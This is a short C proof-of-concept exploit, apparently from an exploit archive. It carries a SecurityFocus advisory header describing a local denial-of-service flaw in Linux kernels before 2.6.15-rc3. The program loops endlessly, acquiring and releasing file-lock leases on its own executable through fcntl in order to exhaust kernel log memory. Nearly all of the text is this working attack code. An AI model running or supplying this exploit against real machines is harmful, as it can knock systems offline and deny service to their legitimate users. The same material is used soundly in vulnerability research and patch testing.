/*
source: http://www.securityfocus.com/bid/15627/info

Linux kernel is susceptible to a local denial-of-service vulnerability.

Local attackers may trigger this issue by obtaining numerous file-lock leases, which will consume excessive kernel log memory. Once the leases timeout, the event will be logged, and kernel memory will be consumed.

This issue allows local attackers to consume excessive kernel memory, eventually leading to an out-of-memory condition and a denial of service for legitimate users.

Kernel versions prior to 2.6.15-rc3 are vulnerable to this issue. 
*/

#include <unistd.h>

#include <stdlib.h>

#include <linux/fcntl.h>

int main(int ac, char **av)

{

    char *fname = av[0];

    int fd = open(fname, O_RDONLY);

    int r;

    

    while (1) {

        r = fcntl(fd, F_SETLEASE, F_RDLCK);

        if (r == -1) {

            perror("F_SETLEASE, F_RDLCK");

            exit(1);

        }

        r = fcntl(fd, F_SETLEASE, F_UNLCK);

        if (r == -1) {

            perror("F_SETLEASE, F_UNLCK");

            exit(1);

        }

    }

    return 0;

}